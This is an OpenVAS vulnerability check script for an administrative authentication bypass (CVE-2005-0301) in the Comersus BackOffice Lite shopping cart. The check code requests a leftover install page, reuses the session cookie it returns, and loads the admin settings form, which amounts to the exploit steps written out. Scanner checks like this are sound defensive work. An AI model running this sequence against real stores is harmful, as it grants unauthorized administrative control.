# OpenVAS Vulnerability Test
# $Id: backoffice_lite_bypass.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Comersus BackOffice Lite Administrative Bypass
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2005 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "Comersus ASP shopping cart is a set of ASP scripts creating an online 
shoppingcart. It works on a database of your own choosing, default is 
msaccess, and includes online administration tools.

By accessing the /comersus_backoffice_install10.asp file it is possible
to bypass the need to authenticate as an administrative user.";

tag_solution = "Delete the file '/comersus_backoffice_install10.asp' from the
server as it is not needed after the installation process has been
completed.";

# Subject: bug report comersus Back Office Lite 6.0 and 6.0.1
# From: "raf somers" <beltech2bugtraq@hotmail.com>
# Date: 2005-01-21 18:07

if(description)
{
 script_id(16227);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2005-0301");
 script_bugtraq_id(12362);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 
 name = "Comersus BackOffice Lite Administrative Bypass";

 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);
 
 summary = "Checks for the presence of a BackOffice Lite Administrative Bypass";
 
 script_summary(summary);
 
 script_category(ACT_ATTACK);
 
 script_copyright("This script is Copyright (C) 2005 Noam Rathaus");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

if(!get_port_state(port))exit(0);

function check(loc)
{
 req = http_get(item: string(loc, "/comersus_backoffice_install10.asp"), port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if('Installation complete' >< r && 'Final Step' >< r && 'Installation Wizard' >< r)
 {
  v = eregmatch(pattern: "Set-Cookie[0-9]?: *([^; ]+)", string: r);

  if (!isnull(v))
  {
   cookie = v[1];
   req = string("GET ", loc, "/comersus_backoffice_settingsModifyForm.asp HTTP/1.1\r\n",
   				"Host: ", get_host_name(), ":", port, "\r\n",
				"Cookie: ", cookie, "\r\n",
				"\r\n");
									
   r = http_keepalive_send_recv(port:port, data:req);
   if (r == NULL) exit(0);
   if ('Modify Store Settings' >< r && 'Basic Admin Utility' >< r)
   {
    security_hole(port:port);
    exit(0);
   }
  }
 }
}

foreach dir (make_list("/comersus/backofficeLite", "/comersus", cgi_dirs()))
{
 check(loc:dir);
}

